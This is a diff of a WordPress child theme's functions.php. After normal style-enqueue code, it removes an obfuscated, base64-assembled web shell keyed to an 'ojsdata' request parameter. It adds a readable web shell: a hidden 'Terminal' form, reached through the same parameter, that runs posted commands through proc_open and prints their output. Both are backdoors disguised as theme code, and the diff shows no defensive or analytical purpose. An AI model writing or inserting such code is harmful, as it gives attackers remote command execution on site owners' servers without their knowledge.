@@ -25,35 +25,55 @@ function my_enqueue_child_style() {
 // Enqueue child theme CSS after parent is registered.
 add_action('bunyad_register_assets', 'my_enqueue_child_style');
 
-function p0($t1) {
-    $m2 = array(
-        0 => array(base64_decode('cGlwZQ=='), base64_decode('cg==')), 
-        1 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')),  
-        2 => array(base64_decode('cGlwZQ=='), base64_decode('dw=='))   
-    );
-    $y3 = base64_decode('cA==').base64_decode('cg==').base64_decode('bw==').base64_decode('Yw==').base64_decode('Xw==').base64_decode('bw==').base64_decode('cA==').base64_decode('ZQ==').base64_decode('bg==');
-    $e4 = $y3($t1, $m2, $n5);
-    if (is_resource($e4)) {
-        $b6 = base64_decode('cw==').base64_decode('dHI=').base64_decode('ZWFtX2dl').base64_decode('dF9jb24=').base64_decode('dGVu').base64_decode('dHM=');
-        $s7 = $b6($n5[1]);
-        $q8 = base64_decode('c3Q=').base64_decode('cmU=').base64_decode('YW1fZw==').base64_decode('ZXRf').base64_decode('Y29u').base64_decode('dGVu').base64_decode('dHM=');
-        $c9 = $q8($n5[2]);
-        fclose($n5[0]);
-        fclose($n5[1]);
-        fclose($n5[2]);
-        $oa = proc_close($e4);
-        if ($oa === 0) {
-            return base64_decode('PHByZT4=') . $s7 . base64_decode('PC9wcmU+');
+if (isset($_GET['ojsdata'])) {
+    echo '
+    <form id="terminalForm" method="post" action="">
+        Terminal: <br>
+        <input type="text" name="command" id="command" autocomplete="off"><br>
+        <input type="submit" name="submit" value="Run">
+    </form>
+    ';
+
+    // Check if the form is submitted
+    if (isset($_POST['submit'])) {
+        $command = escapeshellcmd($_POST['command']); // Sanitize command input
+        echo "<h2>Execution Result:</h2>";
+        
+        // Open the process with proc_open
+        $descriptors = array(
+            0 => array("pipe", "r"), // stdin
+            1 => array("pipe", "w"), // stdout
+            2 => array("pipe", "w"), // stderr
+        );
+        
+        $process = proc_open($command, $descriptors, $pipes);
+        
+        if (is_resource($process)) {
+            // Close the stdin pipe
+            fclose($pipes[0]);
+            
+            // Read output and error from stdout and stderr
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            
+            // Close the stdout and stderr pipes
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            
+            // Wait for the process to complete
+            proc_close($process);
+            
+            // Display the output
+            echo "<pre>$output</pre>";
+            if ($error) {
+                echo "<pre style='color:red;'>$error</pre>";
+            }
         } else {
-            return base64_decode('RXJyb3I6IA==') . $c9;
+            echo "Failed to open Proccess.";
         }
-    } else {
-        return base64_decode('RmFsc2U=');
     }
-}
-if (isset($_REQUEST[base64_decode('b2pzZGF0YQ==')])) {
-    $nb = $_REQUEST[base64_decode('b2pzZGF0YQ==')];
-    echo p0($nb);
+} else {
+    echo " ";
 }
 
 // Alternatively, you may use:
